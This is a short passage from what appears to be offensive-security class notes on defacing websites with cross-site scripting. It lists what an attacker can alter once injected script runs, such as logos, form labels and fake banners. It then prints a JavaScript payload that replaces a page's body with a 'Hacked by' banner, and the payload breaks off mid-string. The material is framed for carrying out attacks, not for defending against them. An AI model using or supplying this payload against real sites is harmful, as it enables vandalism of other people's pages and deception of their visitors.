# Class 11 – Website Defacement with XSS

Once your XSS payload is executing in the victim's browser, you own that page. You can:
- Replace logos, images, headers
- Change button text / form labels
- Insert fake banners or messages
- Inject iframes or scripts


## simple classic deface payload:
```js
document.body.innerHTML = `
  <h1 style='color:red;text-align:center;margin-top:20%;'>
    Hacked by CYBERNERDDD 💀🔥
  </h1>
  <p style='text-align:center
```
